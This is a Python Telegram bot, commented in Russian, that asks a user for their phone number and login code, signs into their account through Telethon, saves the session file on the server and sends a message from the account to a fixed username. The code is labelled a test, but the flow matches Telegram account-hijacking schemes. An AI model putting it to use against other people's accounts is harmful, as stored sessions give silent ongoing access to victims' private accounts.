import os
import asyncio
from telethon import TelegramClient
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
from config import API_ID, API_HASH, TELEGRAM_BOT_TOKEN

# Тестовое сообщение и целевой юзернейм для отправки
MESSAGE_TEXT = "Привет! Это тестовое сообщение."
TARGET_USERNAME = "@zeroyzz"

# Папка для хранения сессий Telethon
SESSION_DIR = "sessions/"
os.makedirs(SESSION_DIR, exist_ok=True)

# Этапы диалога: сначала получаем номер, затем - код (если требуется)
PHONE, CODE = range(2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Обработчик команды /start.
    Запускает диалог и запрашивает номер телефона в международном формате.
    """
    await update.message.reply_text(
        "Привет! Введите ваш номер телефона в международном формате, например, +79143520888"
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Обработчик получения номера телефона.
    Создаёт клиент Telethon и пытается подключиться.
    Если сессия не авторизована, отправляет код на указанный номер.
    """
    phone = update.message.text.strip()
    context.user_data["phone"] = phone
    # Формируем название файла сессии
    session_file = os.path.join(SESSION_DIR, phone)
    context.user_data["session_file"] = session_file
    context.user_data["client"] = TelegramClient(session_file, API_ID, API_HASH)
    
    client: TelegramClient = context.user_data["client"]
    await update.message.reply_text("Обрабатываю авторизацию...")
    await client.connect()

    if not await client.is_user_authorized():
        try:
            await client.send_code_request(phone)
            await update.message.reply_text("Введите код, который вы получили:")
            return CODE
        except Exception as e:
            await update.message.reply_text(f"Ошибка при отправке кода: {e}")
            return ConversationHandler.END
    else:
        me = await client.get_me()
        await update.message.reply_text(f"Вы уже авторизованы как {me.username or me.first_name}.")
        await send_message(client, update)
        await client.disconnect()
        return ConversationHandler.END

async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Обработчик получения кода.
    После ввода кода выполняется вход в аккаунт Telethon.
    При успешной авторизации отправляется тестовое сообщение.
    """
    code = update.message.text.strip()
    phone = context.user_data["phone"]
    client: TelegramClient = context.user_data["client"]
    try:
        await client.sign_in(phone, code)
        me = await client.get_me()
        await update.message.reply_text(f"Авторизация успешна! Вы: {me.username or me.first_name}")
        await send_message(client, update)
    except Exception as e:
        await update.message.reply_text(f"Ошибка авторизации: {e}\nПопробуйте снова, введя /start")
    finally:
        await client.disconnect()
    return ConversationHandler.END

async def send_message(client: TelegramClient, update: Update):
    """
    Функция отправки тестового сообщения в указанный чат.
    """
    try:
        await client.send_message(TARGET_USERNAME, MESSAGE_TEXT)
        await update.message.reply_text(f"Сообщение успешно отправлено пользователю {TARGET_USERNAME}.")
    except Exception as e:
        await update.message.reply_text(f"Ошибка отправки сообщения: {e}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Обработчик отмены диалога.
    """
    await update.message.reply_text("Операция отменена.")
    return ConversationHandler.END

def main():
    """
    Основная функция для запуска бота.
    """
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    application.add_handler(conv_handler)
    application.run_polling()

if __name__ == "__main__":
    main()